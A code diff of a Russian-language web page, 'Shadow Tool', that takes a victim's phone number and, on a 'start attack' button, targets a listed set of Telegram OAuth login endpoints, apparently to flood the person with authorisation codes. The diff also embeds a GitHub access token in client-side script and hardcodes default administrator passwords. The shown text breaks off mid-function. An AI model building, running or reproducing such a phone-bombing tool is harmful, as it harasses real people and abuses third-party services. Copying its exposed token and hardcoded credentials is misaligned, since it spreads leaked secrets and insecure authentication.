@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
     <title>Shadow Tool - Мощный инструмент</title>
     <style>
-        /* ========== ОСНОВНЫЕ СТИЛИ ========== */
         * {
             margin: 0;
             padding: 0;
@@ -23,7 +22,6 @@
             overflow-x: hidden;
         }
 
-        /* ========== ЗВЁЗДНОЕ НЕБО ========== */
         .star-field {
             position: fixed;
             top: 0;
@@ -48,14 +46,9 @@
         .star.medium { width: 2px; height: 2px; }
         .star.small { width: 1px; height: 1px; }
 
-        /* ========== АНИМАЦИИ ========== */
         @keyframes glow {
             0%, 100% { text-shadow: 0 0 5px #fff, 0 0 10px #fff; }
             50% { text-shadow: 0 0 20px #fff, 0 0 30px #fff; }
-        }
-        @keyframes borderFlow {
-            0%, 100% { border-color: #ffffff; }
-            50% { border-color: #888888; }
         }
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(20px); }
@@ -66,7 +59,6 @@
             50% { transform: scale(1.02); }
         }
 
-        /* ========== КОНТЕЙНЕРЫ ========== */
         .container {
             max-width: 1200px;
             margin: 0 auto;
@@ -74,7 +66,6 @@
             z-index: 1;
         }
 
-        /* ========== ШАПКА ========== */
         .glitch-container {
             text-align: center;
             margin: 30px 0;
@@ -122,7 +113,6 @@
             letter-spacing: 2px;
         }
 
-        /* ========== ВКЛАДКИ ========== */
         .tabs {
             display: flex;
             justify-content: center;
@@ -174,7 +164,6 @@
             display: block;
         }
 
-        /* ========== ТЕРМИНАЛ ========== */
         .terminal {
             background: rgba(0, 0, 0, 0.85);
             border: 2px solid #ffffff;
@@ -198,7 +187,6 @@
         .terminal-dot.yellow { background: #ffbd2e; }
         .terminal-dot.green { background: #27c93f; }
 
-        /* ========== ФОРМЫ ========== */
         input, textarea, select {
             width: 100%;
             padding: 15px;
@@ -254,7 +242,6 @@
             flex: 1;
         }
 
-        /* ========== ЛОГИ ========== */
         .logs {
             height: 300px;
             overflow-y: auto;
@@ -281,7 +268,6 @@
             color: #55ff55;
         }
 
-        /* ========== ТАБЛИЦЫ ========== */
         .data-table {
             width: 100%;
             border-collapse: collapse;
@@ -302,7 +288,6 @@
             background: rgba(255, 255, 255, 0.05);
         }
 
-        /* ========== СТАТУС ========== */
         .status {
             position: fixed;
             bottom: 20px;
@@ -317,7 +302,6 @@
             animation: pulse 2s infinite;
         }
 
-        /* ========== МОДАЛЬНЫЕ ОКНА ========== */
         .modal {
             position: fixed;
             top: 0;
@@ -352,7 +336,6 @@
             background: transparent;
         }
 
-        /* ========== АДМИН ПАНЕЛИ ========== */
         .admin-panel {
             background: rgba(255, 255, 255, 0.05);
             border: 2px solid #ffffff;
@@ -389,7 +372,6 @@
             color: #000000;
         }
 
-        /* ========== АВТОРИЗАЦИЯ ========== */
         .auth-overlay {
             position: fixed;
             top: 0;
@@ -428,7 +410,6 @@
             color: #fff;
         }
 
-        /* ========== АДАПТИВНОСТЬ ========== */
         @media (max-width: 768px) {
             body { padding: 10px; }
             .glitch { font-size: 2em; letter-spacing: 3px; }
@@ -443,34 +424,12 @@
             .button-group { flex-direction: column; }
             .button-group button { width: 100%; }
         }
-
-        /* ========== ДОПОЛНИТЕЛЬНЫЕ ЭФФЕКТЫ ========== */
-        .blink {
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-        .rainbow-text {
-            animation: rainbow 3s infinite;
-        }
-        @keyframes rainbow {
-            0%, 100% { color: #ff0000; }
-            16% { color: #ffff00; }
-            33% { color: #00ff00; }
-            50% { color: #00ffff; }
-            66% { color: #0000ff; }
-            83% { color: #ff00ff; }
-        }
     </style>
 </head>
 <body>
 
-<!-- ЗВЁЗДНОЕ ПОЛЕ -->
 <div class="star-field" id="starField"></div>
 
-<!-- МОДАЛКА АВТОРИЗАЦИИ -->
 <div class="auth-overlay" id="authOverlay">
     <div class="auth-box">
         <h2 id="authTitle">🔐 АВТОРИЗАЦИЯ</h2>
@@ -482,31 +441,26 @@
     </div>
 </div>
 
-<!-- ОСНОВНОЙ КОНТЕНТ -->
 <div class="main-content" id="mainContent" style="display: none;">
     <div class="container">
-        <!-- КНОПКА ПОДДЕРЖКИ -->
         <div style="position: fixed; top: 20px; right: 20px; z-index: 100;">
             <button onclick="openSupportModal()" style="background: #000; border: 1px solid #fff; padding: 8px 15px; font-size: 0.8em;">📞 ПОДДЕРЖКА</button>
         </div>
 
-        <!-- ШАПКА -->
         <div class="glitch-container">
             <div class="glitch" data-text="SHADOW TOOL">SHADOW TOOL</div>
             <div class="author">⚡ AUTHOR: AMNESIA ⚡</div>
         </div>
 
-        <!-- ВКЛАДКИ -->
         <div class="tabs">
-            <button class="tab-btn active" onclick="switchTab('main')">🎯 ГЛАВНАЯ</button>
-            <button class="tab-btn" onclick="switchTab('tutorial')">📖 ТУТОРИАЛ</button>
-            <button class="tab-btn" onclick="switchTab('history')">📜 ИСТОРИЯ</button>
-            <button class="tab-btn admin-only" id="whitelistTabBtn" onclick="switchTab('whitelist')" style="display: none;">📋 БЕЛЫЙ ЛИСТ</button>
-            <button class="tab-btn admin-only" id="usersTabBtn" onclick="switchTab('users')" style="display: none;">👥 ПОЛЬЗОВАТЕЛИ</button>
-            <button class="tab-btn" onclick="switchTab('team')">👑 КОМАНДА</button>
+            <button class="tab-btn active" onclick="switchTab('main', this)">🎯 ГЛАВНАЯ</button>
+            <button class="tab-btn" onclick="switchTab('tutorial', this)">📖 ТУТОРИАЛ</button>
+            <button class="tab-btn" onclick="switchTab('history', this)">📜 ИСТОРИЯ</button>
+            <button class="tab-btn admin-only" id="whitelistTabBtn" onclick="switchTab('whitelist', this)" style="display: none;">📋 БЕЛЫЙ ЛИСТ</button>
+            <button class="tab-btn admin-only" id="usersTabBtn" onclick="switchTab('users', this)" style="display: none;">👥 ПОЛЬЗОВАТЕЛИ</button>
+            <button class="tab-btn" onclick="switchTab('team', this)">👑 КОМАНДА</button>
         </div>
 
-        <!-- ВКЛАДКА: ГЛАВНАЯ -->
         <div id="mainTab" class="tab-content active">
             <div class="terminal">
                 <div class="terminal-header">
@@ -515,7 +469,7 @@
                     <div class="terminal-dot green"></div>
                     <span style="margin-left: 10px;">shadow@tool:~</span>
                 </div>
-                <input type="text" id="phone" placeholder="Введите номер телефона (пример: +79001234567)">
+                <input type="text" id="phone" placeholder="Введите номер телефона (любой формат: +79001234567, +380991234567, +1234567890)">
                 <div class="button-group">
                     <button onclick="startAttack()">🚀 НАЧАТЬ АТАКУ</button>
                     <button onclick="clearLogs()">🗑️ ОЧИСТИТЬ ЛОГИ</button>
@@ -526,25 +480,20 @@
             </div>
         </div>
 
-        <!-- ВКЛАДКА: ТУТОРИАЛ -->
         <div id="tutorialTab" class="tab-content">
             <div class="terminal">
                 <h2 style="margin-bottom: 20px;">📚 ТУТОРИАЛ ПО ИСПОЛЬЗОВАНИЮ</h2>
                 <div style="margin-bottom: 25px; padding: 15px; border-left: 3px solid #fff;">
                     <h3>ШАГ 1: РЕГИСТРАЦИЯ / ВХОД</h3>
-                    <p>Создайте аккаунт или войдите с существующими данными. </p>
+                    <p>Создайте аккаунт. Первый зарегистрированный пользователь получает права администратора.</p>
                 </div>
                 <div style="margin-bottom: 25px; padding: 15px; border-left: 3px solid #fff;">
                     <h3>ШАГ 2: АТАКА</h3>
-                    <p>Введите номер телефона в формате +7XXXXXXXXXX и нажмите "Начать атаку". Будет отправлено 10 запросов.</p>
+                    <p>Введите номер телефона в ЛЮБОМ международном формате и нажмите "Начать атаку". Будет отправлено 10 запросов.</p>
                 </div>
                 <div style="margin-bottom: 25px; padding: 15px; border-left: 3px solid #fff;">
                     <h3>ШАГ 3: БЕЛЫЙ ЛИСТ (ТОЛЬКО ДЛЯ АДМИНА)</h3>
-                    <p>Добавляйте номера в белый список, чтобы защитить их от атак. Номера хранятся в файле whitelist.json</p>
-                </div>
-                <div style="margin-bottom: 25px; padding: 15px; border-left: 3px solid #fff;">
-                    <h3>ШАГ 4: УПРАВЛЕНИЕ ПОЛЬЗОВАТЕЛЯМИ (ТОЛЬКО ДЛЯ АДМИНА)</h3>
-                    <p>Выдавайте и забирайте права администратора, удаляйте пользователей.</p>
+                    <p>Добавляйте номера в белый список, чтобы защитить их от атак. Номера автоматически синхронизируются с GitHub.</p>
                 </div>
                 <div style="padding: 15px; border-left: 3px solid #ff5555; background: rgba(255,85,85,0.1);">
                     <h3 style="color: #ff5555;">⚠️ ВНИМАНИЕ</h3>
@@ -553,7 +502,6 @@
             </div>
         </div>
 
-        <!-- ВКЛАДКА: ИСТОРИЯ -->
         <div id="historyTab" class="tab-content">
             <div class="terminal">
                 <h2 style="margin-bottom: 20px;">📜 ИСТОРИЯ АТАК</h2>
@@ -588,12 +536,11 @@
             </div>
         </div>
 
-        <!-- ВКЛАДКА: БЕЛЫЙ ЛИСТ -->
         <div id="whitelistTab" class="tab-content">
             <div class="terminal">
                 <div class="admin-panel">
                     <h3>➕ ДОБАВИТЬ НОМЕР В БЕЛЫЙ ЛИСТ</h3>
-                    <input type="text" id="newPhone" placeholder="Номер телефона (пример: +79001234567)">
+                    <input type="text" id="newPhone" placeholder="Номер телефона (любой формат)">
                     <input type="text" id="newNote" placeholder="Примечание (кто это)">
                     <div class="button-group">
                         <button onclick="addToWhitelist()">✅ ДОБАВИТЬ</button>
@@ -604,61 +551,40 @@
                     <h3>📋 ЗАЩИЩЁННЫЕ НОМЕРА</h3>
                     <div style="overflow-x: auto;">
                         <table class="data-table" id="whitelistTable">
-                            <thead>
-                                <tr><th>#</th><th>НОМЕР</th><th>ПРИМЕЧАНИЕ</th><th>ДАТА ДОБАВЛЕНИЯ</th><th>ДЕЙСТВИЕ</th></tr>
-                            </thead>
-                            <tbody id="whitelistBody">
-                                <tr><td colspan="5" style="text-align: center;">Белый список пуст</td></tr>
-                            </tbody>
+                            <thead><tr><th>#</th><th>НОМЕР</th><th>ПРИМЕЧАНИЕ</th><th>ДАТА</th><th>ДЕЙСТВИЕ</th></tr></thead>
+                            <tbody id="whitelistBody"><tr><td colspan="5">Загрузка...</td></tr></tbody>
                         </table>
                     </div>
-                </div>
-                <div style="margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.05); border: 1px solid #ffaa00;">
-                    <p style="color: #ffaa00;">⚠️ ВНИМАНИЕ: Номера сохраняются в локальное хранилище. Чтобы сохранить навсегда, скачайте файл whitelist.json и загрузите его в репозиторий на GitHub.</p>
                 </div>
             </div>
         </div>
 
-        <!-- ВКЛАДКА: ПОЛЬЗОВАТЕЛИ -->
         <div id="usersTab" class="tab-content">
             <div class="terminal">
                 <h2 style="margin-bottom: 20px;">👥 УПРАВЛЕНИЕ ПОЛЬЗОВАТЕЛЯМИ</h2>
                 <div style="overflow-x: auto;">
                     <table class="data-table" id="usersTable">
-                        <thead>
-                            <tr><th>ЮЗЕРНЕЙМ</th><th>ДАТА РЕГИСТРАЦИИ</th><th>СТАТУС</th><th>ДЕЙСТВИЯ</th></tr>
-                        </thead>
-                        <tbody id="usersBody">
-                            <tr><td colspan="4" style="text-align: center;">Загрузка...</td></tr>
-                        </tbody>
+                        <thead><tr><th>ЮЗЕРНЕЙМ</th><th>ДАТА</th><th>СТАТУС</th><th>ДЕЙСТВИЯ</th></tr></thead>
+                        <tbody id="usersBody"><tr><td colspan="4">Загрузка...</td></tr></tbody>
                     </table>
                 </div>
             </div>
         </div>
 
-        <!-- ВКЛАДКА: КОМАНДА -->
         <div id="teamTab" class="tab-content">
             <div class="terminal">
                 <h2 style="margin-bottom: 20px;">👑 НАША КОМАНДА</h2>
-                <div id="teamList">
-                    <div style="display: flex; align-items: center; gap: 20px; padding: 20px; border: 1px solid #fff; margin-bottom: 15px;">
-                        <div style="width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(135deg, #fff, #888);"></div>
-                        <div>
-                            <h3 style="color: #fff;">Amnesia</h3>
-                            <p>Основатель и главный разработчик</p>
-                            <p style="color: #888;">@Amnesia</p>
-                        </div>
-                    </div>
+                <div style="display: flex; align-items: center; gap: 20px; padding: 20px; border: 1px solid #fff; margin-bottom: 15px;">
+                    <div style="width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(135deg, #fff, #888);"></div>
+                    <div><h3>Amnesia</h3><p>Основатель и разработчик</p><p style="color: #888;">@Amnesia</p></div>
                 </div>
             </div>
         </div>
 
-        <!-- СТАТУС -->
         <div class="status" id="status">🟢 STATUS: READY</div>
     </div>
 </div>
 
-<!-- МОДАЛКА ПОДДЕРЖКИ -->
 <div class="modal" id="supportModal">
     <div class="modal-content">
         <h2>📞 ПОДДЕРЖКА</h2>
@@ -669,10 +595,12 @@
 </div>
 
 <script>
-    // ============================================================
-    // ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
-    // ============================================================
-    
+    // Конфиг GitHub
+    const GITHUB_TOKEN = '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';
+    const REPO_OWNER = 'shadowtool1';
+    const REPO_NAME = 'lol';
+    const WHITELIST_FILE = 'whitelist.json';
+
     let currentUser = null;
     let isAdmin = false;
     let authMode = 'login';
@@ -681,10 +609,6 @@
     let attackHistory = [];
     let attackStats = { total: 0, successful: 0, failed: 0 };
     
-    // URL для белого списка
-    const WHITELIST_URL = 'https://shadowtool1.github.io/lol/whitelist.json';
-    
-    // Список URL для атаки
     const ATTACK_URLS = [
         'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
         'https://translations.telegram.org/auth/request',
@@ -697,61 +621,38 @@
         'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
         'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin'
     ];
-    
-    // ============================================================
-    // ========== ИНИЦИАЛИЗАЦИЯ ЗВЁЗД ==========
-    // ============================================================
-    
+
     function initStars() {
         const starField = document.getElementById('starField');
         starField.innerHTML = '';
         const starCount = window.innerWidth < 768 ? 100 : 200;
-        
         for (let i = 0; i < starCount; i++) {
             const star = document.createElement('div');
             star.classList.add('star');
-            
-            const size = Math.random();
-            if (size > 0.7) star.classList.add('big');
-            else if (size > 0.3) star.classList.add('medium');
+            const r = Math.random();
+            if (r > 0.7) star.classList.add('big');
+            else if (r > 0.3) star.classList.add('medium');
             else star.classList.add('small');
-            
             star.style.left = Math.random() * 100 + '%';
             star.style.top = Math.random() * 100 + '%';
             star.style.animationDelay = Math.random() * 5 + 's';
             star.style.animationDuration = 3 + Math.random() * 4 + 's';
-            
             starField.appendChild(star);
         }
     }
-    
-    // ============================================================
-    // ========== СИСТЕМА ПОЛЬЗОВАТЕЛЕЙ ==========
-    // ============================================================
-    
+
     function loadUsers() {
         const saved = localStorage.getItem('shadow_users');
-        if (saved) {
-            users = JSON.parse(saved);
-        } else {
-            users = [];
-        }
+        if (saved) users = JSON.parse(saved);
+        else users = [];
         
-        // Добавляем админа по умолчанию
-        if (!users.find(u => u.username === 'Amnesia')) {
-            users.push({
-                username: 'Amnesia',
-                password: 'Qwerty1412',
-                isAdmin: true,
-                registeredAt: new Date().toISOString()
-            });
+        if (users.length === 0) {
+            users.push({ username: 'Amnesia', password: 'admin123', isAdmin: true, registeredAt: new Date().toISOString() });
             saveUsers();
         }
     }
     
-    function saveUsers() {
-        localStorage.setItem('shadow_users', JSON.stringify(users));
-    }
+    function saveUsers() { localStorage.setItem('shadow_users', JSON.stringify(users)); }
     
     function checkSession() {
         const session = localStorage.getItem('shadow_session');
@@ -765,10 +666,8 @@
                     document.getElementById('authOverlay').style.display = 'none';
                     document.getElementById('mainContent').style.display = 'block';
                     if (isAdmin) {
-                        const whitelistBtn = document.getElementById('whitelistTabBtn');
-                        const usersBtn = document.getElementById('usersTabBtn');
-                        if (whitelistBtn) whitelistBtn.style.display = 'inline-block';
-                        if (usersBtn) usersBtn.style.display = 'inline-block';
+                        document.getElementById('whitelistTabBtn').style.display = 'inline-block';
+                        document.getElementById('usersTabBtn').style.display = 'inline-block';
                         renderUsersTable();
                     }
                     loadWhitelist();
@@ -785,19 +684,9 @@
     
     function toggleAuthMode() {
         authMode = authMode === 'login' ? 'register' : 'login';
-        const title = document.getElementById('authTitle');
-        const btn = document.getElementById('authBtn');
-        const switchText = document.querySelector('.switch-mode');
-        
-        if (authMode === 'login') {
-            title.innerHTML = '🔐 АВТОРИЗАЦИЯ';
-            btn.innerHTML = 'ВОЙТИ';
-            switchText.innerHTML = 'Нет аккаунта? Зарегистрироваться';
-        } else {
-            title.innerHTML = '📝 РЕГИСТРАЦИЯ';
-            btn.innerHTML = 'ЗАРЕГИСТРИРОВАТЬСЯ';
-            switchText.innerHTML = 'Уже есть аккаунт? Войти';
-        }
+        document.getElementById('authTitle').innerHTML = authMode === 'login' ? '🔐 АВТОРИЗАЦИЯ' : '📝 РЕГИСТРАЦИЯ';
+        document.getElementById('authBtn').innerHTML = authMode === 'login' ? 'ВОЙТИ' : 'ЗАРЕГИСТРИРОВАТЬСЯ';
+        document.querySelector('.switch-mode').innerHTML = authMode === 'login' ? 'Нет аккаунта? Зарегистрироваться' : 'Уже есть аккаунт? Войти';
         document.getElementById('authError').innerHTML = '';
     }
     
@@ -805,21 +694,13 @@
         const username = document.getElementById('authUsername').value.trim();
         const password = document.getElementById('authPassword').value.trim();
         const errorDiv = document.getElementById('authError');
-        
-        if (!username || !password) {
-            errorDiv.innerHTML = '❌ Заполните все поля!';
-            return;
-        }
+        if (!username || !password) { errorDiv.innerHTML = '❌ Заполните все поля!'; return; }
         
         if (authMode === 'login') {
             const user = users.find(u => u.username === username && u.password === password);
             if (user) {
-                currentUser = user;
-                isAdmin = user.isAdmin;
-                localStorage.setItem('shadow_session', JSON.stringify({
-                    username: username,
-                    expires: Date.now() + 7 * 24 * 60 * 60 * 1000
-                }));
+                currentUser = user; isAdmin = user.isAdmin;
+                localStorage.setItem('shadow_session', JSON.stringify({ username, expires: Date.now() + 7*24*60*60*1000 }));
                 document.getElementById('authOverlay').style.display = 'none';
                 document.getElementById('mainContent').style.display = 'block';
                 if (isAdmin) {
@@ -827,241 +708,145 @@
                     document.getElementById('usersTabBtn').style.display = 'inline-block';
                     renderUsersTable();
                 }
-                loadWhitelist();
-                loadHistory();
-                updateStatsDisplay();
+                loadWhitelist(); loadHistory(); updateStatsDisplay();
                 addLog(`Добро пожаловать, ${username}!`, 'success');
-            } else {
-                errorDiv.innerHTML = '❌ Неверный юзернейм или пароль!';
-            }
+            } else errorDiv.innerHTML = '❌ Неверный юзернейм или пароль!';
         } else {
-            if (users.find(u => u.username === username)) {
-                errorDiv.innerHTML = '❌ Пользователь уже существует!';
-                return;
-            }
-            const newUser = {
-                username: username,
-                password: password,
-                isAdmin: false,
-                registeredAt: new Date().toISOString()
-            };
-            users.push(newUser);
+            if (users.find(u => u.username === username)) { errorDiv.innerHTML = '❌ Пользователь уже существует!'; return; }
+            const isFirstAdmin = users.length === 0;
+            users.push({ username, password, isAdmin: isFirstAdmin, registeredAt: new Date().toISOString() });
             saveUsers();
-            currentUser = newUser;
-            isAdmin = false;
-            localStorage.setItem('shadow_session', JSON.stringify({
-                username: username,
-                expires: Date.now() + 7 * 24 * 60 * 60 * 1000
-            }));
+            currentUser = users[users.length-1]; isAdmin = isFirstAdmin;
+            localStorage.setItem('shadow_session', JSON.stringify({ username, expires: Date.now() + 7*24*60*60*1000 }));
             document.getElementById('authOverlay').style.display = 'none';
             document.getElementById('mainContent').style.display = 'block';
-            loadWhitelist();
-            loadHistory();
-            updateStatsDisplay();
+            if (isAdmin) {
+                document.getElementById('whitelistTabBtn').style.display = 'inline-block';
+                document.getElementById('usersTabBtn').style.display = 'inline-block';
+            }
+            loadWhitelist(); loadHistory(); updateStatsDisplay();
             addLog(`Регистрация успешна! Добро пожаловать, ${username}!`, 'success');
         }
     }
     
-    // ============================================================
-    // ========== УПРАВЛЕНИЕ ПОЛЬЗОВАТЕЛЯМИ (АДМИН) ==========
-    // ============================================================
-    
     function renderUsersTable() {
         const tbody = document.getElementById('usersBody');
         if (!tbody) return;
-        
-        if (users.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="4" style="text-align: center;">Нет пользователей</td></tr>';
-            return;
-        }
-        
+        if (users.length === 0) { tbody.innerHTML = '<tr><td colspan="4">Нет пользователей</td></tr>'; return; }
         tbody.innerHTML = users.map(user => `
             <tr>
                 <td>${escapeHtml(user.username)}</td>
                 <td>${new Date(user.registeredAt).toLocaleString()}</td>
-                <td>${user.isAdmin ? '<span style="color: #55ff55;">✅ АДМИН</span>' : '<span style="color: #888;">👤 ПОЛЬЗОВАТЕЛЬ</span>'}</td>
-                <td>
-                    ${!user.isAdmin ? `<button onclick="makeAdmin('${escapeHtml(user.username)}')" class="success-btn" style="padding: 5px 10px; margin-right: 5px;">👑 Сделать админом</button>` : ''}
-                    ${user.isAdmin && user.username !== 'Amnesia' ? `<button onclick="revokeAdmin('${escapeHtml(user.username)}')" class="warning-btn" style="padding: 5px 10px; margin-right: 5px;">⭐ Забрать админку</button>` : ''}
-                    ${user.username !== 'Amnesia' ? `<button onclick="deleteUser('${escapeHtml(user.username)}')" class="danger-btn" style="padding: 5px 10px;">🗑️ Удалить</button>` : ''}
-                </td>
+                <td>${user.isAdmin ? '<span style="color:#55ff55;">АДМИН</span>' : '<span style="color:#888;">ПОЛЬЗОВАТЕЛЬ</span>'}</td>
+                <td>${!user.isAdmin ? `<button onclick="makeAdmin('${escapeHtml(user.username)}')" class="success-btn" style="padding:5px 10px;">👑 Сделать админом</button>` : ''}
+                    ${user.isAdmin && user.username !== 'Amnesia' ? `<button onclick="revokeAdmin('${escapeHtml(user.username)}')" class="warning-btn" style="padding:5px 10px;">⭐ Забрать админку</button>` : ''}
+                    ${user.username !== 'Amnesia' ? `<button onclick="deleteUser('${escapeHtml(user.username)}')" class="danger-btn" style="padding:5px 10px;">🗑️ Удалить</button>` : ''}</td>
             </tr>
         `).join('');
     }
     
-    function makeAdmin(username) {
-        const user = users.find(u => u.username === username);
-        if (user) {
-            user.isAdmin = true;
-            saveUsers();
-            renderUsersTable();
-            addLog(`Пользователь ${username} назначен администратором`, 'success');
-        }
-    }
-    
-    function revokeAdmin(username) {
-        const user = users.find(u => u.username === username);
-        if (user && username !== 'Amnesia') {
-            user.isAdmin = false;
-            saveUsers();
-            renderUsersTable();
-            addLog(`У пользователя ${username} забраны права администратора`, 'warning');
-        }
-    }
-    
-    function deleteUser(username) {
-        if (username === 'Amnesia') {
-            alert('Нельзя удалить главного администратора!');
-            return;
-        }
-        if (confirm(`Удалить пользователя ${username}?`)) {
-            users = users.filter(u => u.username !== username);
-            saveUsers();
-            renderUsersTable();
-            addLog(`Пользователь ${username} удалён`, 'error');
-        }
-    }
-    
-    // ============================================================
-    // ========== БЕЛЫЙ СПИСОК ==========
-    // ============================================================
+    function makeAdmin(username) { const u = users.find(u => u.username === username); if(u){ u.isAdmin=true; saveUsers(); renderUsersTable(); addLog(`${username} назначен админом`,'success');} }
+    function revokeAdmin(username) { const u = users.find(u => u.username === username); if(u && username!=='Amnesia'){ u.isAdmin=false; saveUsers(); renderUsersTable(); addLog(`У ${username} забраны права`,'warning');} }
+    function deleteUser(username) { if(username==='Amnesia'){alert('Нельзя удалить!');return;} if(confirm(`Удалить ${username}?`)){ users=users.filter(u=>u.username!==username); saveUsers(); renderUsersTable(); addLog(`${username} удалён`,'error');} }
     
     async function loadWhitelist() {
         try {
-            const response = await fetch(WHITELIST_URL + '?t=' + Date.now());
-            const data = await response.json();
-            whitelist = data.phones || [];
-        } catch (e) {
-            console.error('Ошибка загрузки белого списка:', e);
-            whitelist = [];
-        }
-        
-        // Также загружаем локальную копию
-        const localWhitelist = localStorage.getItem('shadow_whitelist');
-        if (localWhitelist) {
-            const local = JSON.parse(localWhitelist);
-            if (local.length > whitelist.length) {
-                whitelist = local;
-            }
-        }
-        
+            const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${WHITELIST_FILE}?t=${Date.now()}`);
+            if(res.ok){
+                const data = await res.json();
+                const decoded = atob(data.content);
+                whitelist = JSON.parse(decoded).phones || [];
+            } else { whitelist = []; }
+        } catch(e) { whitelist = []; }
         renderWhitelistTable();
-        return whitelist;
-    }
-    
-    function saveLocalWhitelist() {
-        localStorage.setItem('shadow_whitelist', JSON.stringify(whitelist));
     }
     
     function renderWhitelistTable() {
         const tbody = document.getElementById('whitelistBody');
-        if (!tbody) return;
-        
-        if (whitelist.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="5" style="text-align: center;">Белый список пуст</td></tr>';
-            return;
-        }
-        
-        tbody.innerHTML = whitelist.map((item, idx) => `
+        if(!tbody) return;
+        if(whitelist.length===0){ tbody.innerHTML='<tr><td colspan="5">Белый список пуст</td></tr>'; return; }
+        tbody.innerHTML = whitelist.map((item,idx)=>`
             <tr>
-                <td>${idx + 1}</td>
+                <td>${idx+1}</td>
                 <td>${escapeHtml(item.number)}</td>
-                <td>${escapeHtml(item.note || '-')}</td>
-                <td>${item.timestamp ? new Date(item.timestamp).toLocaleString() : '—'}</td>
-                <td><button onclick="removeFromWhitelist(${idx})" class="danger-btn" style="padding: 5px 10px;">🗑️ Удалить</button></td>
+                <td>${escapeHtml(item.note||'-')}</td>
+                <td>${item.timestamp?new Date(item.timestamp).toLocaleString():'—'}</td>
+                <td><button onclick="removeFromWhitelist(${idx})" class="danger-btn" style="padding:5px 10px;">🗑️</button></td>
             </tr>
         `).join('');
     }
     
-    async function addToWhitelist() {
-        if (!isAdmin) {
-            alert('Только администратор может добавлять номера в белый список!');
-            return;
-        }
-        
-        let phone = document.getElementById('newPhone').value.trim();
-        const note = document.getElementById('newNote').value.trim();
-        
-        if (!phone) {
-            alert('Введите номер телефона!');
-            return;
-        }
-        
-        // Нормализация номера
-        let cleanPhone = phone.replace(/[^0-9]/g, '');
-        if (cleanPhone.startsWith('8')) cleanPhone = '7' + cleanPhone.slice(1);
-        if (!cleanPhone.startsWith('7')) cleanPhone = '7' + cleanPhone;
-        const normalizedPhone = '+' + cleanPhone;
-        
-        if (whitelist.some(item => item.number === normalizedPhone)) {
-            alert('Этот номер уже в белом списке!');
-            return;
-        }
-        
-        whitelist.push({
-            number: normalizedPhone,
-            note: note,
-            timestamp: new Date().toISOString()
-        });
-        
-        saveLocalWhitelist();
-        renderWhitelistTable();
-        
-        document.getElementById('newPhone').value = '';
-        document.getElementById('newNote').value = '';
-        
-        addLog(`Номер ${normalizedPhone} добавлен в белый список`, 'success');
-        alert(`✅ Номер ${normalizedPhone} добавлен в белый список!\n\n⚠️ Чтобы сохранить навсегда, скачайте whitelist.json и загрузите в репозиторий.`);
+    async function syncToGithub() {
+        const content = JSON.stringify({ phones: whitelist }, null, 2);
+        const encoded = btoa(unescape(encodeURIComponent(content)));
+        try {
+            const getRes = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${WHITELIST_FILE}`, {
+                headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Accept': 'application/vnd.github.v3+json' }
+            });
+            let sha = null;
+            if(getRes.ok){
+                const data = await getRes.json();
+                sha = data.sha;
+            }
+            const putRes = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${WHITELIST_FILE}`, {
+                method: 'PUT',
+                headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Accept': 'application/vnd.github.v3+json', 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message: `Update whitelist ${new Date().toISOString()}`, content: encoded, sha: sha })
+            });
+            if(putRes.ok) addLog('✅ Синхронизация с GitHub успешна', 'success');
+            else addLog('❌ Ошибка синхронизации', 'error');
+        } catch(e){ addLog(`❌ Ошибка: ${e.message}`, 'error'); }
     }
     
-    function removeFromWhitelist(index) {
-        if (!isAdmin) return;
-        const item = whitelist[index];
-        if (!item) return;
-        
-        if (confirm(`Удалить ${item.number} из белого списка?`)) {
-            whitelist.splice(index, 1);
-            saveLocalWhitelist();
+    async function addToWhitelist() {
+        if(!isAdmin){ alert('Только админ!'); return; }
+        let phone = document.getElementById('newPhone').value.trim();
+        const note = document.getElementById('newNote').value.trim();
+        if(!phone){ alert('Введите номер!'); return; }
+        let clean = phone.replace(/[^0-9+]/g, '');
+        if(!clean.startsWith('+')) clean = '+' + clean.replace(/^8/, '7');
+        if(whitelist.some(i=>i.number===clean)){ alert('Уже в списке!'); return; }
+        whitelist.push({ number: clean, note: note, timestamp: new Date().toISOString() });
+        renderWhitelistTable();
+        await syncToGithub();
+        document.getElementById('newPhone').value = '';
+        document.getElementById('newNote').value = '';
+        addLog(`✅ ${clean} добавлен в белый список`, 'success');
+    }
+    
+    function removeFromWhitelist(idx) {
+        if(!isAdmin) return;
+        const item = whitelist[idx];
+        if(confirm(`Удалить ${item.number}?`)){
+            whitelist.splice(idx,1);
             renderWhitelistTable();
-            addLog(`Номер ${item.number} удалён из белого списка`, 'warning');
+            syncToGithub();
+            addLog(`❌ ${item.number} удалён из белого списка`, 'warning');
         }
     }
     
     function downloadWhitelistFile() {
         const data = JSON.stringify({ phones: whitelist }, null, 2);
-        const blob = new Blob([data], { type: 'application/json' });
-        const url = URL.createObjectURL(blob);
+        const blob = new Blob([data], {type:'application/json'});
         const a = document.createElement('a');
-        a.href = url;
+        a.href = URL.createObjectURL(blob);
         a.download = 'whitelist.json';
         a.click();
-        URL.revokeObjectURL(url);
